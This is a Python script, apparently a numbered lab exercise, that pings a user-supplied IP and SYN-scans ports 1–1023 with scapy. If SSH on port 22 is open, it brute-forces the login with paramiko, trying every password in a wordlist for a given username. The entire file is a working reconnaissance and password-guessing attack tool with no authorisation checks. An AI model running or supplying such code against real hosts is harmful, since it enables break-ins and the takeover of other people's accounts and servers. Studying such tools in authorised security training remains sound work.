# Steps 1,2,3
import scapy.all
from scapy.config import conf
from scapy.layers.inet import IP, TCP, ICMP
# Step 25
import paramiko
from scapy.sendrecv import sr1, sr
from scapy.volatile import RandShort

# Step 4 and 5
# User IP input
Target: str = input("Please, enter the IP address of the target: ")
# Port range
Registered_Ports: range = range(1, 1024)
# List for open ports
open_ports = []

# Steps 7, 8, 9, 10, 11, 12, 13
# Function for scanning a single port
def scan_port(port: int, timeout: float = 0.5) -> bool:
    conf.verb = 0
    source_port = RandShort()
    syn_packet = sr1(IP(dst=Target) / TCP(sport=source_port, dport=port, flags="S"), timeout=0.5)
    if not syn_packet:
        return False
    if not syn_packet.haslayer(TCP):
        return False
    if syn_packet.getlayer(TCP).flags == 0x12:
        sr(IP(dst=Target) / TCP(sport=source_port, dport=port, flags="R"), timeout=2)
        return True
    else:
        return False

# Steps 14, 15, 16, 17, 18, 19
# Function for checking reachable target
def check_target() -> bool:
    try:
        conf.verb = 0
        icmp = sr1(IP(dst=Target) / ICMP(), timeout=3)
    except Exception as e:
        print(e)
        return False
    if icmp is not None:
        return True
    else:
        return False

# Steps from 26 to 37
# Function for performing a BF Attack
def brute_force(port):
    passwords: list = []
    try:
        with open("PasswordList.txt", "r") as file:
            for line in file.readlines():
                passwords.append(line.strip())
    except Exception as e:
        print("Error while reading the file: ", e)
        return
    user: str = input("Please, enter the username for the SSH server: ")
    ssh_conn = paramiko.SSHClient()
    ssh_conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in passwords:
        try:
            ssh_conn.connect(Target, port=int(port), username=user, password=password, timeout=1)
            print(f"Password was found: {password}")
            ssh_conn.close()
            break
        except Exception as e:
            print(f"{password} failed")

# Function for scanning open ports 
# IF port 22 is open - > Perform a BF attack 
def main():
    open_ports: list = []
    # Steps 20, 21, 22, 23, 24
    if check_target():
        print("Scanning in progress...")
        for port in Registered_Ports:
            status = scan_port(port)
            if status:
                open_ports.append(port)
                print("Opened port: " + str(port))
        print("Scanning done.")
    else:
        print("The target is wrong!")
    # steps 38, 39, 40
    if 22 in open_ports:
        print(f"Port 22 is open, would you like to perform BF Attack? Y/N?")
        if input().upper() == "Y":
            brute_force("22")
        else:
            print("No attack performed.")
    else:
        print("Port 22 is not opened.")

if __name__ == '__main__':
    main()
